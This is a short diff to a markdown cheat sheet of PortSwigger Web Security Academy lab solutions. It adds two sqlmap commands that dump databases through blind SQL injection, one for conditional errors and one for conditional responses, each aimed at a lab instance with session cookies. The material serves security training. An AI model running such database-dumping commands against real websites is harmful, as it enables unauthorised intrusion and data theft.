@@ -72,8 +72,10 @@ In the Positions tab of Burp Intruder, change the value of the cookie to:
 
 <img width="742" alt="image" src="https://github.com/katvik001/PortSwigger-Academy-CheatSheets/assets/21978067/c95b03a3-e247-4345-b216-52d4956f18b7">
 
-
-
+**Blind SQL injection with conditional errors**
+sqlmap -u 'https://0af800e604055c7d819e399800bf00c6.web-security-academy.net/filter?category=Lifestyle' --cookie='TrackingId=nDU4jKT9hjQE9mr5; session=PFERWY0rKpJ7bPszXsQKXVAnzmZyBLWq' --level 2 --dbms=postgresql --dump --threads=5
+**Blind SQL injection with conditional responses**
+sqlmap -u 'https://0af8009d04c75cb982ec1fad00b000f3.web-security-academy.net/' --cookie='TrackingId=vXlhdCuFfEh7btYf; session=vOVSLroAEJ568bYWzcLsRf7OY9fKVohP' --level 2 --dbms=oracle --dump --threads=5
 
  
 ## Summary
